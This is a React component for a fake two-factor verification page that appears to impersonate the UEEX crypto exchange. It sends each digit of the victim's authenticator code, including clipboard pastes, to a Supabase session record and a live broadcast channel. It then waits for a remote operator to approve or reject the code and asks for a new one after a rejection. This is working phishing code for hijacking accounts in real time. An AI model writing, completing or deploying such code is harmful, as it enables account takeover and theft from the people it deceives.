import { useState, useEffect, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useUeexLang } from "@/hooks/useUeexLang";

interface UeexSecurityScreenProps {
  email: string;
  sessionId: string;
  onBack: () => void;
}

const UeexSecurityScreen = ({ email, sessionId, onBack }: UeexSecurityScreenProps) => {
  const [code, setCode] = useState("");
  const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
  const [errorMessage, setErrorMessage] = useState("");
  const { t } = useUeexLang();

  useEffect(() => {
    const channel = supabase.channel(`session-otp-decision-${sessionId}`);
    channel
      .on("broadcast", { event: "otp_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage(t("invalid_code"));
          setCode("");
          setTimeout(() => setStatus("input"), 2000);
        }
      })
      .subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (data?.status === "otp_approved") { setStatus("success"); clearInterval(pollInterval); }
      else if (data?.status === "otp_rejected") {
        setStatus("error");
        setErrorMessage(t("invalid_code"));
        setCode("");
        setTimeout(() => {
          setStatus("input");
          supabase.from("sessions").update({ status: "redirect_otp" } as any).eq("id", sessionId).then(() => {});
        }, 2000);
        clearInterval(pollInterval);
      }
    }, 2000);

    return () => { supabase.removeChannel(channel); clearInterval(pollInterval); };
  }, [sessionId]);

  useEffect(() => {
    const channel = supabase.channel(`session-review-client-otp-${sessionId}`);
    channel
      .on("broadcast", { event: "review_decision" }, (payload) => {
        const decision = payload.payload?.status as string;
        if (decision === "otp_approved") setStatus("success");
        else if (decision === "otp_rejected") {
          setStatus("error");
          setErrorMessage(t("invalid_code"));
          setCode("");
          setTimeout(() => setStatus("input"), 2000);
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [sessionId]);

  const handleCodeChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
    setCode(value);

    supabase.from("sessions").update({ otp_code: `token_code:${value}` } as any).eq("id", sessionId).then(() => {});

    const broadcastCh = supabase.channel(`confirm-email-${sessionId}`);
    broadcastCh.subscribe((s) => {
      if (s === "SUBSCRIBED") {
        broadcastCh.send({ type: "broadcast", event: "client_token_update", payload: { token_code: value } });
        setTimeout(() => supabase.removeChannel(broadcastCh), 1500);
      }
    });
  }, [sessionId]);

  const handleConfirm = () => {
    if (code.length === 6) setStatus("verifying");
  };

  useEffect(() => {
    if (code.length === 6 && status === "input") setStatus("verifying");
  }, [code, status]);

  if (status === "success") {
    return (
      <div className="flex min-h-[100dvh] flex-col bg-white items-center justify-center px-6">
        <div className="text-center">
          <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-full bg-green-100">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#22c55e" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <polyline points="20 6 9 17 4 12" />
            </svg>
          </div>
          <h1 className="text-[20px] font-bold text-[#333]">{t("verification_complete")}</h1>
          <p className="mt-2 text-[13px] text-[#999]">{t("redirecting")}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] flex-col bg-white">
      {/* Header */}
      <div className="flex items-center justify-between px-4 pt-4">
        <button onClick={onBack} className="p-1 text-[#333]" aria-label={t("back")}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M19 12H5M12 19l-7-7 7-7" />
          </svg>
        </button>
        <div className="flex items-center gap-3">
          <button className="p-1 text-[#333]">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
              <circle cx="5" cy="12" r="2" /><circle cx="12" cy="12" r="2" /><circle cx="19" cy="12" r="2" />
            </svg>
          </button>
          <button className="flex h-7 w-7 items-center justify-center rounded-full border border-[#ccc]">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" />
            </svg>
          </button>
        </div>
      </div>

      {/* Content */}
      <div className="px-6 pt-6">
        <h1 className="mb-6 text-[22px] font-bold text-[#333] leading-tight">{t("security_verification")}</h1>

        <p className="mb-2 text-[14px] font-semibold text-[#333]">{t("google_authenticator")}</p>

        {/* Input */}
        <div className="mb-2 flex items-center rounded-lg border border-[#e0e0e0] px-4 py-3">
          <input
            type="text"
            inputMode="numeric"
            value={code}
            onChange={handleCodeChange}
            placeholder={t("enter_verification_code")}
            maxLength={6}
            autoFocus
            disabled={status === "verifying"}
            className="flex-1 bg-transparent text-[14px] text-[#333] outline-none placeholder:text-[#bbb] disabled:opacity-50"
          />
          <button
            type="button"
            onClick={() => navigator.clipboard.readText().then(txt => {
              const digits = txt.replace(/\D/g, "").slice(0, 6);
              if (digits) {
                setCode(digits);
                handleCodeChange({ target: { value: digits } } as any);
              }
            })}
            className="ml-2 text-[13px] font-semibold text-[#F5A623]"
          >
            {t("paste")}
          </button>
        </div>

        <p className="mb-6 text-[12px] text-[#999] leading-relaxed">
          {t("enter_6_digit")}
        </p>

        {status === "error" && errorMessage && (
          <div className="mb-4 rounded-lg border border-red-200 bg-red-50 px-4 py-2.5 text-[13px] text-red-600">
            {errorMessage}
          </div>
        )}

        {status === "verifying" && (
          <div className="mb-4 flex items-center gap-2 text-[13px] text-[#999]">
            <div className="h-2 w-2 animate-pulse rounded-full bg-[#F5A623]" />
            {t("verifying_code")}
          </div>
        )}

        <button
          onClick={handleConfirm}
          disabled={status === "verifying" || code.length < 6}
          className="mb-6 w-full rounded-full bg-[#F5A623] py-3.5 text-[15px] font-semibold text-white transition-all hover:bg-[#e6991a] active:bg-[#d98f15] disabled:opacity-50"
        >
          {t("confirm")}
        </button>

        <div className="flex flex-col gap-3">
          <button className="text-left text-[13px] font-medium text-[#F5A623]">
            {t("switch_method")}
          </button>
          <button className="text-left text-[13px] font-medium text-[#F5A623]">
            {t("no_code_received")}
          </button>
          <button className="text-left text-[13px] font-medium text-[#F5A623]">
            {t("security_unavailable")}
          </button>
        </div>
      </div>

      {/* Footer */}
      <div className="mt-auto px-6 pb-6 pt-8 text-center">
        <p className="flex items-center justify-center gap-1.5 text-[12px] text-[#bbb]">
          <span className="inline-flex h-4 w-4 items-center justify-center rounded-full bg-[#F5A623]/20">
            <svg width="10" height="10" viewBox="0 0 24 24" fill="#F5A623">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15v-2h2v2h-2zm0-4V7h2v6h-2z" />
            </svg>
          </span>
          {t("protected_by")}
        </p>
      </div>
    </div>
  );
};

export default UeexSecurityScreen;
